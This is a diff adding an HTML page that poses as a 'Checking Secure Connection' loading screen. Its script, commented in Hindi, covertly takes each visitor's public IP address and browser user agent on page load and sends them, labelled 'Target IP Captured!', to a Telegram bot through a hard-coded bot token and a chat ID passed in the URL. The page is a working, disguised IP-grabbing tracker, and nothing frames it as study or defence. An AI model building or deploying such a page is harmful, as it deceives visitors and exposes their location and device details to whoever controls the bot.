@@ -1,1 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checking Connection...</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0f172a;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+            flex-direction: column;
+        }
+        .loader-container {
+            margin: auto;
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border-left-color: #38bdf8;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 25px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h1 { color: #f8fafc; font-size: 22px; font-weight: 600; margin-bottom: 10px; }
+        p { color: #94a3b8; font-size: 14px; }
+    </style>
+</head>
+<body>
 
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <h1>Checking Secure Connection</h1>
+        <p>Please wait while we verify your request network...</p>
+    </div>
+
+    <script>
+        // 1. URL से 'uid' (Telegram Chat ID) निकालना
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('uid');
+
+        // आपका टेलीग्राम बोट टोकन
+        const BOT_TOKEN = "8835274198:AAHY5VdHQVZAictbhddI9FwQpEUQ17Xkdgw";
+
+        if (chatId) {
+            // 2. आईपी ग्रैब करने के लिए ipify API का उपयोग
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    const userAgent = navigator.userAgent;
+
+                    // टेलीग्राम मैसेज का टेक्स्ट फॉर्मेट (Markdown)
+                    const textMessage = `🌐 *Target IP Captured!*\n\n• *IP Address:* \`${ipAddress}\`\n• *Device Info:* \`${userAgent}\``;
+
+                    // 3. बिना किसी सर्वर के, सीधे टेलीग्राम API को हिट करके बोट में मैसेज भेजना
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: textMessage,
+                            parse_mode: 'Markdown'
+                        })
+                    }).catch(err => console.log("Telegram API Error:", err));
+                })
+                .catch(err => console.log("IP Fetch Error:", err));
+        }
+    </script>
+</body>
+</html>
